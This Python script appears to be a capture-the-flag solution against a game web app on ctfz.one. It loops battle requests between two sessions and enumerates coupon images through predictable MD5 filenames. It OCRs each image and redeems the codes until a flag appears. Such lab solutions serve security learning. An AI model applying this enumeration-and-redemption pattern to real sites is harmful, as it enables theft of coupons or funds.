import requests, time

from PIL import Image
import pytesseract
from hashlib import md5
from io import BytesIO
import re
import sys

s1 = requests.Session()
s2 = requests.Session()
s3 = requests.Session()






r1 = s1.post("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/login", data={'login':'terjanq4', 'password':'aaa','action':'save'})

# r1 = s1.post("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/login", data={'login':'terjanq', 'password':'aaa','action':'save'})

# r2 = s2.post("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/login", data={'login':'terjanq2', 'password':'aaa','action':'save'})




def fight():
	while True:
		try:
			s2.get("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/game/battle/offer/2")
		except:
			pass
		try:
			s1.get("http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/game/battle/accept/597")
		except:
			pass
		time.sleep(0.1)


def getMoney(coupon):
	r1 = s1.post('http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/', data={'coupon':coupon, 'action':'save'})
	if("ctfzone" in r1.text) :
		print(s1.text, coupon)
		sys.exit(0)

	if("No such coupon" in r1.text):
		print("!! NO COUPON !! ", coupon)

	r1 = s1.post('http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/confirm', data={'action':'save'})
	if("ctfzone" in r1.text) :
		print(s1.text, coupon)
		sys.exit(0)

	




f = open("log", "w");

def tryCoupon(idd):
	hid = md5(str(idd).encode()).hexdigest()
	image = requests.get(f"http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_{hid}.png")
	image = BytesIO(image.content);
	g = open(f"./coupons/coupon_{hid}.png", "wb");
	g.write(image.read());
	g.close()
	text = pytesseract.image_to_string(Image.open(image))
	if("ctfzone" in text) :
		print(text, idd, hid)
		sys.exit(0)	
	f.write(text + "\n")
	coupon = re.search('ID: (.+)', text).group(1)
	getMoney(coupon)




for i in range(835, 1300):
	print(i)
	# tryCoupon(i)
	try:
		tryCoupon(i)
	except:
		print("!! ERROR !! ")





